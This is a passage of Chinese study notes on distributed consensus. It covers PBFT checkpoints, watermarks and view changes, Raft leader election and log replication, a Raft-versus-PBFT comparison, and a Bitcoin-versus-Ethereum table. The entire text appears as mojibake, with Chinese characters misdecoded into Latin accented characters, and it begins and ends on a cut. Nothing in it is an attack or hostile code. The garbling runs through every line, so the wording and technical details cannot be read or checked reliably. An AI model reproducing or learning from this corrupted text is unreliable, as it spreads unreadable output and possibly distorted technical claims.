i\u003eï¼Œnæ˜¯å½“å‰èŠ‚ç‚¹æ‰€ä¿ç•™çš„æœ€åä¸€ä¸ªè§†å›¾è¯·æ±‚ç¼–å·ï¼Œdæ˜¯å¯¹å½“å‰çŠ¶æ€çš„ä¸€ä¸ªæ‘˜è¦ï¼Œè¯¥CheckPointæ¶ˆæ¯è®°å½•åˆ°logä¸­ã€‚\nå¦‚æœå‰¯æœ¬èŠ‚ç‚¹iæ”¶åˆ°äº†2f+1ä¸ªéªŒè¯è¿‡çš„CheckPointæ¶ˆæ¯ï¼Œåˆ™æ¸…é™¤å…ˆå‰æ—¥å¿—ä¸­çš„æ¶ˆæ¯ï¼Œå¹¶ä»¥nä½œä¸ºå½“å‰ä¸€ä¸ªstable checkpointã€‚\n   stable checkpointï¼ˆç¨³å®šæ£€æŸ¥ç‚¹ï¼‰å‘¢ï¼Ÿ\nå¤§éƒ¨åˆ†èŠ‚ç‚¹ï¼ˆ2f+1ï¼‰å·²ç»å…±è¯†å®Œæˆçš„æœ€å¤§è¯·æ±‚åºå·ã€‚æ¯”å¦‚ç³»ç»Ÿæœ‰4ä¸ªèŠ‚ç‚¹ï¼Œä¸‰ä¸ªèŠ‚ç‚¹éƒ½å·²ç»å…±è¯†å®Œäº†çš„è¯·æ±‚ç¼–å·æ˜¯213.é‚£ä¹ˆè¿™ä¸ª213å°±æ˜¯stable checkpoint\n  å®é™…ä¸Šå½“å‰¯æœ¬èŠ‚ç‚¹iå‘å…¶ä»–èŠ‚ç‚¹å‘å‡ºCheckPointæ¶ˆæ¯åï¼Œå…¶ä»–èŠ‚ç‚¹æœ‰å¯èƒ½è¿˜æ²¡æœ‰å®ŒæˆKæ¡è¯·æ±‚ï¼Œæ‰€ä»¥ä¸ä¼šç«‹å³å¯¹içš„è¯·æ±‚ä½œå‡ºå“åº”ï¼Œå®ƒè¿˜ä¼šæŒ‰ç…§è‡ªå·±çš„èŠ‚å¥ï¼Œå‘å‰è¡Œè¿›ã€‚æ­¤æ—¶å‘å‡ºçš„CheckPointæœªèƒ½å½¢æˆstableï¼Œä¸ºé˜²æ­¢içš„å¤„ç†è¯·æ±‚è¿‡å¿«ï¼Œè®¾ç½®ä¸€ä¸ªé«˜ä½æ°´ä½åŒºé—´[h, H]æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ ä½æ°´ä½hç­‰äºä¸Šä¸€ä¸ªstable checkpointç¼–å·ï¼Œé«˜æ°´ä½H = h + Lï¼Œå…¶ä¸­Læ˜¯æˆ‘ä»¬æŒ‡å®šçš„æ•°å€¼ï¼ˆå¦‚100ï¼Œæˆ–200ï¼‰ï¼Œ å½“å‰¯æœ¬èŠ‚ç‚¹iå¤„ç†è¯·æ±‚è¶…è¿‡é«˜æ°´ä½Hæ—¶ï¼Œå°±ä¼šåœæ­¢è„šæ­¥ï¼Œç­‰å¾…stable checkpointå‘ç”Ÿå˜åŒ–ï¼Œå†ç»§ç»­å‰è¿›ã€‚\nç®—æ³•è§†å›¾å˜æ›´ æ¯ä¸ªå‰¯èŠ‚ç‚¹ç»´æŒä¸€ä¸ªè®¡æ•°å™¨ã€‚å¤‡ä»½èŠ‚ç‚¹åœ¨æ¥æ”¶åˆ°ä¸€ä¸ªæœ‰æ•ˆè¯·æ±‚ï¼Œä½†æ˜¯è¿˜æ²¡æœ‰æ‰§è¡Œå®ƒæ—¶ï¼Œä¼šæŸ¥çœ‹è®¡æ—¶å™¨æ˜¯å¦åœ¨è¿è¡Œï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£ä¹ˆå®ƒå°†å¯åŠ¨è®¡æ—¶å™¨ï¼›å½“è¯·æ±‚è¢«æ‰§è¡Œæ—¶å°±æŠŠè®¡æ—¶å™¨åœæ­¢ã€‚\nå¦‚æœè®¡æ—¶å™¨è¶…æ—¶ï¼Œå°†ä¼šæŠŠè§†å›¾å˜æ›´çš„æ¶ˆæ¯å‘å…¨ç½‘å¹¿æ’­ã€‚åœ¨ä¸»èŠ‚ç‚¹å¤±æ•ˆçš„æ—¶å€™ä»ç„¶ä¿è¯ç³»ç»Ÿçš„æ´»æ€§ï¼Œé˜²æ­¢å¤‡ä»½èŠ‚ç‚¹æ— æœŸé™åœ°ç­‰å¾…è¯·æ±‚çš„æ‰§è¡Œã€‚éœ€è¦ç¡®ä¿åœ¨æ–°çš„viewä¸­å¦‚ä½•æ¥å»¶ç»­ä¸Šä¸€ä¸ªviewæœ€ç»ˆçš„çŠ¶æ€ï¼Œ æ¯”å¦‚ç»™è¿™æ—¶æ¥çš„æ–°è¯·æ±‚çš„ç¼–å·ï¼Œæ¯”å¦‚å¦‚ä½•å¤„ç†ä¸Šä¸€ä¸ªviewè¿˜æ²¡æ¥å¾—åŠå®Œå…¨å¤„ç†å¥½çš„è¯·æ±‚\nè®¡æ—¶å™¨è¶…æ—¶æˆ–å‘ç°ä½œæ¶ï¼Œå‰¯èŠ‚ç‚¹ç”Ÿæˆ view-change æ¶ˆæ¯ \u003cVIEW-CHANGE,v+1,n,C,P,i\u003eï¼Œæœ€è¿‘ä¸€æ¬¡çš„ç¨³å®šæ£€æŸ¥ç‚¹å¯¹åº”çš„è¯·æ±‚çš„åºåˆ—å· nï¼ŒC æ˜¯è¯æ˜è¯¥æ£€æŸ¥ç‚¹ç¨³å®šæ€§çš„ 2f+1 ä¸ª checkpoint æ¶ˆæ¯çš„é›†åˆï¼ŒP æ˜¯ Pm çš„é›†åˆï¼Œå…¶ä¸­ m æ˜¯å‰¯èŠ‚ç‚¹ i ä¸­çš„åºåˆ—å·å¤§äº n çš„ç­‰å¾…æäº¤å’Œæ‰§è¡Œçš„å®¢æˆ·ç«¯è¯·æ±‚ mï¼Œæ¯ä¸ª Pm åŒ…å«äº†å¦‚ä¸‹çš„ä¿¡æ¯ï¼šâ‘ pre-prepare æ¶ˆæ¯ï¼›â‘¡2f ä¸ªç”±å…¶ä»–å‰¯èŠ‚ç‚¹ç­¾åçš„è·Ÿ pre-prepare æ¶ˆæ¯åŒ¹é…çš„ã€æœ‰æ•ˆçš„ prepare æ¶ˆæ¯ï¼›\næ­¤æ—¶ï¼ŒèŠ‚ç‚¹éœ€è¦ï¼š\n è®°å½•åˆ°æœ¬åœ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼›\nåŒæ—¶å¹¿æ’­ç»™å…¶ä»–èŠ‚ç‚¹ï¼›\nè¦æ±‚æ›¿æ¢æ‰ä¸»èŠ‚ç‚¹ï¼Œå˜æ›´åˆ°ä¸‹ä¸€ä¸ªè§†å›¾ v+1ï¼›\n  æ³¨æ„ï¼Œåœ¨è§†å›¾å˜æ›´æœŸé—´ï¼Œé™¤äº† checkpointã€view-change å’Œ newview æ¶ˆæ¯ä¹‹å¤–ï¼Œå¤‡ä»½èŠ‚ç‚¹ i æ˜¯ä¸ä¼šæ¥å—å…¶ä»–æ¶ˆæ¯çš„  åœ¨èŠ‚ç‚¹æ”¶åˆ°æ›´æ¢èŠ‚ç‚¹æ¶ˆæ¯æ—¶ï¼Œå„ä¸ªèŠ‚ç‚¹ä¼šæ”¶é›†è§†å›¾å˜æ›´ä¿¡æ¯ï¼Œå¹¶å‘é€ç¡®è®¤ç»™ view v+1 ä¸­çš„ä¸»èŠ‚ç‚¹ã€‚\nï¼ˆv+1 ä¸­çš„ä¸»èŠ‚ç‚¹å¯èƒ½æ˜¯è½®æ¢äº§ç”Ÿï¼Œä¹Ÿå¯èƒ½é€‰ä¸¾äº§ç”Ÿï¼‰\næ–°çš„ä¸»èŠ‚ç‚¹æ¥æ”¶åˆ° 2f ä¸ªæœ‰æ•ˆçš„ view-change æ¶ˆæ¯ä¹‹åï¼Œå‘é€è‡ªå·±ç­¾åÏƒp' çš„ new-view æ¶ˆæ¯\u003cNEW-VIEW, v+1, V, O\u003e ï¼ŒVæ˜¯ä¸»èŠ‚ç‚¹æ”¶åˆ°çš„2f+1ä¸ªæœ‰æ•ˆçš„VIEW-CHANGEæ¶ˆæ¯ ï¼ŒOæ˜¯ä¸»èŠ‚ç‚¹é‡æ–°å‘èµ·çš„æœªç»å®Œæˆçš„PRE-PREPAREæ¶ˆæ¯é›†åˆ\n  æ‰¾åˆ°æ‰€æœ‰èŠ‚ç‚¹çš„å…±åŒçš„ç¨³å®šæ£€æŸ¥ç‚¹hã€‚\n  åœ¨hå’Œh+Lä¹‹é—´ï¼Œå¦‚æœå­˜åœ¨næ¶ˆæ¯ï¼Œåˆ™åˆ›å»º\u003c\u003cPRE-PREPARE, v+1, n, d\u003e, m\u003eæ¶ˆæ¯ã€‚å¦åˆ™åˆ›å»ºä¸€ä¸ªç©ºçš„PRE-PREPAREæ¶ˆæ¯ï¼Œå³ï¼š\u003c\u003cPRE-PREPARE, v+1, n, d(null)\u003e, m(null)\u003e, m(null)ç©ºæ¶ˆæ¯ï¼Œd(null)ç©ºæ¶ˆæ¯æ‘˜è¦ã€‚\n  å¯¹äºèŠ‚ç‚¹v+1ï¼Œæè®®ç³»ç»Ÿå†…æ‰€æœ‰èŠ‚ç‚¹åˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªè§†å›¾ v+1ï¼ŒåŒæ—¶æ¥å—è‡ªå·±æˆä¸ºæ–°çš„ä¸»èŠ‚ç‚¹\nå‰¯èŠ‚ç‚¹æ”¶åˆ°è¦æ±‚å°†è§†å›¾å˜æ›´ä¸º v+1 çš„ new-vew æ¶ˆæ¯åï¼Œç¡®è®¤æ¶ˆæ¯æœ‰æ•ˆï¼Œæ¥å—è¯¥ new-view æ¶ˆæ¯ï¼Œè®°å½•åˆ°æœ¬åœ°æ¶ˆæ¯æ–‡ä»¶ä¸­ï¼ŒåŒæ—¶å°†è§†å›¾æ›´æ¢åˆ°æ–°çš„è§†å›¾v+1ï¼Œå‰¯èŠ‚ç‚¹æŠŠ new-view ä¸­æºå¸¦çš„ç”±æ–°çš„ä¸»èŠ‚ç‚¹é‡æ–°ç”Ÿæˆçš„ pre-prepare æ¶ˆæ¯è¿½åŠ è®°å½•åˆ°æœ¬åœ°çš„æ¶ˆæ¯æ—¥å¿—ä¸­ï¼ŒæŒ‰ç…§æ£€æŸ¥ç‚¹åè®®è¿›è¡Œåƒåœ¾å›æ”¶ï¼Œåˆ é™¤æ¯”è¾ƒè€çš„æ¶ˆæ¯\n å¯¹äº new-vew æ¶ˆæ¯ä¸­é›†åˆ O ä¸­æºå¸¦çš„æ‰€æœ‰ç”±æ–°ä¸»èŠ‚ç‚¹ç”Ÿæˆçš„æ–°çš„ pre-prepare æ¶ˆæ¯ï¼Œå¤‡ä»½èŠ‚ç‚¹éƒ½ä¼šç”Ÿæˆç›¸åº”çš„ prepare æ¶ˆæ¯ï¼Œè®°å½•åˆ°æœ¬åœ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œè½¬å‘ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œå³å¯¹è¿™äº›æœªå¤„ç†çš„è¯·æ±‚åœ¨æ–°çš„è§†å›¾ä¸­é‡æ–°æ‰§è¡Œä¸€éä¸‰é˜¶æ®µåè®®ï¼Œä¿è¯è§†å›¾åˆ‡æ¢è¿‡ç¨‹ä¸­æœªå¤„ç†çš„è¯·æ±‚èƒ½å¤Ÿé‡æ–°è¢«å¤„ç†ã€‚\n   èŠ‚ç‚¹é€‰å‡ºä¸€ä¸ªcheckpointä½œä¸ºæ–°viewå¤„ç†è¯·æ±‚çš„èµ·å§‹çŠ¶æ€checkpointå°±æ˜¯å½“å‰èŠ‚ç‚¹å¤„ç†çš„æœ€æ–°è¯·æ±‚åºå·ã€‚\n  checkpointå°±æ˜¯å½“å‰èŠ‚ç‚¹å¤„ç†çš„æœ€æ–°è¯·æ±‚åºå·ã€‚ å‰æ–‡å·²ç»æåˆ°ä¸»èŠ‚ç‚¹æ”¶åˆ°è¯·æ±‚æ˜¯ä¼šç»™è¯·æ±‚è®°å½•ç¼–å·çš„ã€‚æ¯”å¦‚ä¸€ä¸ªèŠ‚ç‚¹æ­£åœ¨å…±è¯†çš„ä¸€ä¸ªè¯·æ±‚ç¼–å·æ˜¯101ï¼Œé‚£ä¹ˆå¯¹äºè¿™ä¸ªèŠ‚ç‚¹ï¼Œå®ƒçš„checkpointå°±æ˜¯101\n  stable checkpointï¼ˆç¨³å®šæ£€æŸ¥ç‚¹ï¼‰å‘¢ï¼Ÿ\nå¤§éƒ¨åˆ†èŠ‚ç‚¹ï¼ˆ2f+1ï¼‰å·²ç»å…±è¯†å®Œæˆçš„æœ€å¤§è¯·æ±‚åºå·ã€‚æ¯”å¦‚ç³»ç»Ÿæœ‰4ä¸ªèŠ‚ç‚¹ï¼Œä¸‰ä¸ªèŠ‚ç‚¹éƒ½å·²ç»å…±è¯†å®Œäº†çš„è¯·æ±‚ç¼–å·æ˜¯213.é‚£ä¹ˆè¿™ä¸ª213å°±æ˜¯stable checkpointã€‚checkpointçš„æœ€å¤§ç›®çš„æ—¶å‡å°‘å†…å­˜å ç”¨ã€‚\n  å½“æ£€æŸ¥ç‚¹è¢«è¯æ˜æ˜¯ç¨³å®šåï¼ŒèŠ‚ç‚¹ä¼šæŠŠæœ¬åœ°æ¶ˆæ¯æ—¥å¿—ä¸­çš„æ¶ˆæ¯ä¸­å®¢æˆ·ç«¯è¯·æ±‚åºåˆ—å·å°äºæˆ–è€…ç­‰äº n çš„æ¶ˆæ¯ï¼ˆpre-prepareã€prepareã€commit æ¶ˆæ¯ï¼‰éƒ½åˆ æ‰ã€‚åŒæ—¶ï¼Œå®ƒä¼šåˆ æ‰æ—§çš„æ£€æŸ¥ç‚¹å’Œ checkpoint æ¶ˆæ¯ã€‚\nRAFT RAFTæœ€åˆæ˜¯ä¸€ä¸ªç”¨äºç®¡ç†å¤åˆ¶æ—¥å¿—çš„å…±è¯†ç®—æ³•ï¼Œå®ƒæ˜¯ä¸€ä¸ªä¸ºçœŸå®ä¸–ç•Œåº”ç”¨å»ºç«‹çš„åè®®ï¼Œä¸»è¦æ³¨é‡åè®®çš„è½åœ°æ€§å’Œå¯ç†è§£æ€§ï¼ŒRAFTæ˜¯åœ¨éæ‹œå åº­æ•…éšœä¸‹è¾¾æˆå…±è¯†çš„å¼ºä¸€è‡´åè®®\nRaftç®—æ³•åŒ…å«ä¸‰ç§è§’è‰²ï¼Œåˆ†åˆ«æ˜¯ï¼šè·Ÿéšè€…ï¼ˆfollowerï¼‰ï¼Œå€™é€‰äººï¼ˆcandidateï¼‰å’Œé¢†å¯¼è€…ï¼ˆleaderï¼‰ã€‚ä¸€ä¸ªèŠ‚ç‚¹åœ¨æŸä¸€æ—¶åˆ»åªèƒ½æ˜¯è¿™ä¸‰ç§çŠ¶æ€çš„å…¶ä¸­ä¸€ç§ï¼Œè¿™ä¸‰ç§è§’è‰²æ˜¯å¯ä»¥éšç€æ—¶é—´å’Œæ¡ä»¶çš„å˜åŒ–è€Œäº’ç›¸è½¬æ¢çš„ã€‚\næ‰€æœ‰çš„èŠ‚ç‚¹åˆå§‹çŠ¶æ€éƒ½ä¸ºfollowerï¼Œè¶…æ—¶æœªæ”¶åˆ°å¿ƒè·³åŒ…çš„followerå°†å˜èº«candidateå¹¶å¹¿æ’­æŠ•ç¥¨è¯·æ±‚ï¼Œè·å¾—å¤šæ•°æŠ•ç¥¨çš„èŠ‚ç‚¹å°†åŒ–èº«leaderï¼Œè¿™ä¸€è½®æŠ•ç¥¨çš„è¿‡ç¨‹æ˜¯è°å…ˆå‘å‡ºè°æœ‰åˆ©ï¼Œæ¯ä¸ªèŠ‚ç‚¹åªä¼šç»™å‡ºä¸€æ¬¡æŠ•ç¥¨ï¼ŒleaderèŠ‚ç‚¹å‘¨æœŸæ€§ç»™å…¶ä»–èŠ‚ç‚¹å‘é€å¿ƒè·³åŒ…ï¼ŒleaderèŠ‚ç‚¹å¤±æ•ˆå°†ä¼šå¼•å‘æ–°ä¸€è½®çš„æŠ•ç¥¨è¿‡ç¨‹ã€‚\nRafté˜¶æ®µä¸»è¦åˆ†ä¸ºä¸¤ä¸ªï¼Œé¦–å…ˆæ˜¯leaderé€‰ä¸¾è¿‡ç¨‹ï¼Œç„¶ååœ¨é€‰ä¸¾å‡ºæ¥çš„leaderåŸºç¡€ä¸Šè¿›è¡Œæ­£å¸¸æ“ä½œï¼Œæ¯”å¦‚æ—¥å¿—å¤åˆ¶ã€è®°è´¦ç­‰ã€‚\n å…³äºRAFTçš„è¾ƒè¯¦ç»†çš„åŠ¨ç”»ï¼Œå¯è®¿é—® http://thesecretlivesofdata.com/raft/  é€‰ä¸¾æµç¨‹ RAFTçš„leaderé€‰ä¸¾æµç¨‹ï¼š 1ï¼‰ä»»ä½•ä¸€ä¸ªæœåŠ¡å™¨éƒ½å¯ä»¥æˆä¸ºä¸€ä¸ªå€™é€‰è€…candidateï¼Œå®ƒå‘å…¶ä»–æœåŠ¡å™¨followerå‘å‡ºè¦æ±‚é€‰ä¸¾è‡ªå·±çš„è¯·æ±‚ã€‚ 2ï¼‰å…¶ä»–æœåŠ¡å™¨åŒæ„äº†ï¼Œå‘å‡ºOKã€‚æ³¨æ„ï¼Œå¦‚æœåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸€ä¸ªfollowerå®•æœºï¼Œæ²¡æœ‰æ”¶åˆ°è¯·æ±‚é€‰ä¸¾çš„è¦æ±‚ï¼Œæ­¤æ—¶å€™é€‰è€…å¯ä»¥è‡ªå·±é€‰è‡ªå·±ï¼Œåªè¦è¾¾åˆ°N/2+1çš„å¤§å¤šæ•°ç¥¨ï¼Œå€™é€‰äººè¿˜æ˜¯å¯ä»¥æˆä¸ºleaderçš„ã€‚ 3ï¼‰è¿™æ ·è¿™ä¸ªå€™é€‰è€…å°±æˆä¸ºäº†leaderé¢†å¯¼äººï¼Œå®ƒå¯ä»¥å‘é€‰æ°‘ä¹Ÿå°±æ˜¯followerå‘å‡ºæŒ‡ä»¤ï¼Œæ¯”å¦‚è¿›è¡Œè®°è´¦ã€‚ 4ï¼‰ä»¥åé€šè¿‡å¿ƒè·³è¿›è¡Œè®°è´¦çš„é€šçŸ¥ã€‚ 5ï¼‰ä¸€æ—¦è¿™ä¸ªleaderå´©æºƒäº†ï¼Œé‚£ä¹ˆfollowerä¸­æœ‰ä¸€ä¸ªæˆä¸ºå€™é€‰è€…ï¼Œå¹¶å‘å‡ºé‚€ç¥¨é€‰ä¸¾ã€‚ 6ï¼‰followeråŒæ„åï¼Œå…¶æˆä¸ºleaderï¼Œç»§ç»­æ‰¿æ‹…è®°è´¦ç­‰æŒ‡å¯¼å·¥ä½œã€‚ è®°è´¦è¿‡ç¨‹ Raftçš„è®°è´¦è¿‡ç¨‹æŒ‰ä»¥ä¸‹æ­¥éª¤å®Œæˆï¼š 1ï¼‰å‡è®¾leaderé¢†å¯¼äººå·²ç»é€‰å‡ºï¼Œè¿™æ—¶å®¢æˆ·ç«¯å‘å‡ºå¢åŠ ä¸€ä¸ªæ—¥å¿—çš„è¦æ±‚ï¼› 2ï¼‰leaderè¦æ±‚followeréµä»ä»–çš„æŒ‡ä»¤ï¼Œéƒ½å°†è¿™ä¸ªæ–°çš„æ—¥å¿—å†…å®¹è¿½åŠ åˆ°ä»–ä»¬å„è‡ªæ—¥å¿—ä¸­ï¼› 3ï¼‰å¤§å¤šæ•°followeræœåŠ¡å™¨å°†äº¤æ˜“è®°å½•å†™å…¥è´¦æœ¬åï¼Œç¡®è®¤è¿½åŠ æˆåŠŸï¼Œå‘å‡ºç¡®è®¤æˆåŠŸä¿¡æ¯ï¼› 4ï¼‰åœ¨ä¸‹ä¸€ä¸ªå¿ƒè·³ä¸­ï¼Œleaderä¼šé€šçŸ¥æ‰€æœ‰followeræ›´æ–°ç¡®è®¤çš„é¡¹ç›®ã€‚ å¯¹äºæ¯ä¸ªæ–°çš„äº¤æ˜“è®°å½•ï¼Œé‡å¤ä¸Šè¿°è¿‡ç¨‹ RAFTå’ŒPBFTå¯¹æ¯” ä¸€ä¸ªå›¢é˜Ÿä¸€å®šä¼šæœ‰ä¸€ä¸ªè€å¤§å’Œæ™®é€šæˆå‘˜ã€‚å¯¹äºraftç®—æ³•ï¼Œå…±è¯†è¿‡ç¨‹å°±æ˜¯ï¼šåªè¦è€å¤§è¿˜æ²¡æŒ‚ï¼Œè€å¤§è¯´ä»€ä¹ˆï¼Œæˆ‘ä»¬ï¼ˆå›¢é˜Ÿæ™®é€šæˆå‘˜ï¼‰å°±åšä»€ä¹ˆï¼Œåšå†³æ‰§è¡Œã€‚é‚£ä»€ä¹ˆæ—¶å€™é‡æ–°è€å¤§å‘¢ï¼Ÿåªæœ‰å½“è€å¤§æŒ‚äº†æ‰é‡é€‰è€å¤§ï¼Œä¸ç„¶ç”Ÿæ˜¯è€å¤§çš„äººï¼Œæ­»æ˜¯è€å¤§çš„é¬¼ã€‚\nå¯¹äºpbftç®—æ³•ï¼Œå…±è¯†è¿‡ç¨‹å°±æ˜¯ï¼šè€å¤§å‘æˆ‘å‘é€å‘½ä»¤æ—¶ï¼Œå½“æˆ‘è®¤ä¸ºè€å¤§çš„å‘½ä»¤æ˜¯æœ‰é—®é¢˜æ—¶ï¼Œæˆ‘ä¼šæ‹’ç»æ‰§è¡Œã€‚å°±ç®—æˆ‘è®¤ä¸ºè€å¤§çš„å‘½ä»¤æ˜¯å¯¹çš„ï¼Œæˆ‘è¿˜ä¼šé—®ä¸‹å›¢é˜Ÿçš„å…¶å®ƒæˆå‘˜è€å¤§çš„å‘½ä»¤æ˜¯å¦æ˜¯å¯¹çš„ï¼Œåªæœ‰å¤§å¤šæ•°äººï¼ˆ2f+1ï¼‰éƒ½è®¤ä¸ºè€å¤§çš„å‘½ä»¤æ˜¯å¯¹çš„æ—¶å€™ï¼Œæˆ‘æ‰ä¼šå»æ‰§è¡Œå‘½ä»¤ã€‚é‚£ä»€ä¹ˆæ—¶å€™é‡é€‰è€å¤§å‘¢ï¼Ÿè€å¤§æŒ‚äº†å½“ç„¶è¦é‡é€‰ï¼Œå¦‚æœå¤§å¤šæ•°äººéƒ½è®¤ä¸ºè€å¤§ä¸ç§°èŒæˆ–è€…æœ‰é—®é¢˜æ—¶ï¼Œæˆ‘ä»¬ä¹Ÿä¼šé‡æ–°é€‰æ‹©è€å¤§ã€‚\n1.raftç®—æ³•ä»èŠ‚ç‚¹ä¸ä¼šæ‹’ç»ä¸»èŠ‚ç‚¹çš„è¯·æ±‚ï¼Œè€Œpbftç®—æ³•ä»èŠ‚ç‚¹åœ¨æŸäº›æƒ…å†µä¸‹ä¼šæ‹’ç»ä¸»èŠ‚ç‚¹çš„è¯·æ±‚ ;\n2.raftç®—æ³•åªèƒ½å®¹é”™æ•…éšœèŠ‚ç‚¹ï¼Œå¹¶ä¸”æœ€å¤§å®¹é”™èŠ‚ç‚¹æ•°ä¸ºï¼ˆn-1ï¼‰/2ï¼Œè€Œpbftç®—æ³•èƒ½å®¹é”™æ•…éšœèŠ‚ç‚¹å’Œä½œæ¶èŠ‚ç‚¹ï¼Œæœ€å¤§å®¹é”™èŠ‚ç‚¹æ•°ä¸ºï¼ˆn-1ï¼‰/3ã€‚\nåŒºå—é“¾æ¶æ„ æ¯”ç‰¹å¸ åŒºå—é“¾1.0 åŒºå—é“¾1.0æ˜¯å¯ç¼–ç¨‹è´§å¸ï¼Œæ˜¯ä¸è½¬è´¦ã€æ±‡æ¬¾å’Œæ•°å­—åŒ–æ”¯ä»˜ç›¸å…³çš„å¯†ç å­¦è´§å¸åº”ç”¨ï¼Œç›®æ ‡æ˜¯å®ç°è´§å¸çš„å»ä¸­å¿ƒåŒ–ä¸æ”¯ä»˜æ‰‹æ®µã€‚æ¯”ç‰¹å¸æ˜¯åŒºå—é“¾1.0æœ€å…¸å‹çš„ä»£è¡¨, åŒºå—é“¾çš„å‘å±•å‚¬ç”Ÿäº†å¤§é‡çš„è´§å¸äº¤æ˜“å¹³å°ï¼Œå®ç°äº†è´§å¸çš„éƒ¨åˆ†èŒèƒ½ï¼Œèƒ½å¤Ÿå®ç°è´§å“äº¤æ˜“ã€‚\n æ¯”ç‰¹å¸é’±åŒ…ï¼š\n ç§»åŠ¨é’±åŒ… æ¡Œé¢é’±åŒ… äº’è”ç½‘é’±åŒ… çº¸é’±åŒ…   ä¼˜åŠ¿  åˆ©äºå¹¶è¡Œ å¯å›æº¯ é¿å…æ•°æ®è†¨èƒ€  ç¼ºç‚¹  æŸ¥ä½™é¢æ—¶å¿…é¡»å›æº¯æŸ¥è¯¢ä¸€å¤§å †äº¤æ˜“ä¿¡æ¯ï¼Œæµªè´¹å¤§é‡æ—¶é—´å’Œèµ„æº  ä»¥å¤ªåŠ åŒºå—é“¾2.0 åŒºå—é“¾2.0æ˜¯å¯ç¼–ç¨‹é‡‘èï¼Œæ˜¯ç»æµã€å¸‚åœºå’Œé‡‘èé¢†åŸŸçš„åŒºå—é“¾åº”ç”¨ï¼Œæ ¸å¿ƒç†å¿µæ˜¯æŠŠåŒºå—é“¾ä½œä¸ºä¸€ä¸ªå¯ç¼–ç¨‹çš„åˆ†å¸ƒå¼ä¿¡ç”¨åŸºç¡€è®¾æ–½ï¼Œæ”¯æ’‘æ™ºèƒ½åˆçº¦åº”ç”¨ï¼Œä»¥ä¸è¿‡å»æ¯”ç‰¹å¸åŒºå—é“¾ä½œä¸ºä¸€ä¸ªè™šæ‹Ÿè´§å¸æ”¯æ’‘å¹³å°åŒºåˆ«å¼€æ¥ã€‚\nä»¥å¤ªåŠï¼šæ•°å­—ä»£å¸ï¼ŒåŸºäºæ™ºèƒ½åˆçº¦\nä»¥å¤ªåŠæ¶æ„å¦‚ä¸Š\n    æ¯”ç‰¹å¸ ä»¥å¤ªåŠ     è´¦æˆ·è®¾è®¡ æ— è´¦æˆ·çš„æ¦‚å¿µï¼Œæ¯ä¸ªè´¦æˆ·çš„ä½™é¢éƒ½æ˜¯ä»ä»–ä»¬åœ¨åŒºå—é“¾ä¸Šçš„UTXOè®¡ç®—å‡ºæ¥çš„ æ‹¥æœ‰å¤–éƒ¨è´¦æˆ·å’Œåˆçº¦è´¦æˆ·ï¼Œå¤–éƒ¨è´¦æˆ·ä¸ºç”¨æˆ·è´¦æˆ·ï¼Œç”±ç§é’¥æ§åˆ¶ã€‚åˆçº¦è´¦æˆ·æ˜¯ä¸€ç§å¯ç¼–ç¨‹è´¦æˆ·ï¼Œå—ä»£ç æ§åˆ¶å¹¶ç”±å¤–éƒ¨è´¦æˆ·æ¿€æ´»   åŒºå—é“¾è®¾è®¡ é‡‡ç”¨Merkleæ ‘å°†äº¤æ˜“çš„å“ˆå¸Œå€¼ç»„æˆäºŒå‰æ ‘çŠ¶ç»“æ„ï¼Œé¡¶å±‚èŠ‚ç‚¹çš„å“ˆå¸Œå€¼ç”¨æ¥æ ¡éªŒäº¤æ˜“æ¸…å• é‡‡ç”¨Merkle Patriciaæ ‘æ¥å®ç°å¯¹äº¤æ˜“å’ŒçŠ¶æ€çš„æ ¡éªŒå’ŒæŸ¥è¯¢ã€‚   è®¡ç®—å’Œå›¾çµå®Œå¤‡ éå›¾çµå®Œå¤‡ å›¾çµå®Œå¤‡   EVMé«˜çº§è¯­è¨€ ä¸æä¾›é«˜çº§è¯­è¨€æ”¯æŒ æä¾›Solidityã€Serpentã€LLLç­‰é«˜çº§è¯­è¨€è®©ç”¨æˆ·ç¼–å†™æ™ºèƒ½åˆçº¦ï¼Œé«˜çº§è¯­è¨€ä¼šç¼–è¯‘æˆåœ¨EVMä¸­æ‰§è¡Œçš„EVMå­—èŠ‚ç    P2Pç½‘ç»œ æ¯”ç‰¹å¸P2Påè®® åˆ›å»ºå¼•å…¥RLPxä¸Whisperç½‘ç»œåè®®ï¼ŒRLPxåè®®ä¸»è¦åŠŸèƒ½æ˜¯åœ¨èŠ‚ç‚¹é—´å»ºç«‹é€šä¿¡å¹¶ç»´æŒé€šä¿¡ï¼›Whisperåè®®ä¸»è¦ç”¨äºDappä¹‹é—´çš„é€šä¿¡ã€‚ä»¥å¤ªåŠP2Pç½‘ç»œå®ç°äº†æ›´å¤šåŠŸèƒ½æ‰©å±•   äº‹ä»¶ æ— äº‹ä»¶æ¦‚å¿µ ä»¥å¤ªåŠä¸­çš„äº‹ä»¶æ˜¯ä¸€ä¸ªä»¥å¤ªåŠæ—¥å¿—å’Œäº‹ä»¶ç›‘æµ‹çš„åè®®çš„æŠ½è±¡ã€‚æ—¥å¿—çš„è®°å½•ä¸­æä¾›åˆçº¦çš„åœ°å€ï¼›äº‹ä»¶åˆ©ç”¨ç°æœ‰çš„ABIåŠŸèƒ½æ¥è§£ææ—¥å¿—è®°å½•   å…±è¯†æœºåˆ¶ é‡‡ç”¨PoWæœºåˆ¶ï¼Œä¾é çš„æ˜¯CPUè®¡ç®—éš¾åº¦é—®é¢˜ å¯¹æ¯”ç‰¹å¸PoWæœºåˆ¶è¿›è¡Œæ”¹è¿›ï¼ŒåŠ å…¥å†…å­˜éš¾åº¦ï¼Œå…·æœ‰æŠµæŠ—å•å‡­å“ˆå¸Œè¿ç®—ä¼˜åŒ–çš„ASICæŒ–çŸ¿æœºçš„å±æ€§ï¼Œä»¥å¤ªåŠæœªæ¥å°†é‡‡ç”¨PoSå…±è¯†æœºåˆ¶    ä»¥å¤ªåŠå®¢æˆ·ç«¯ 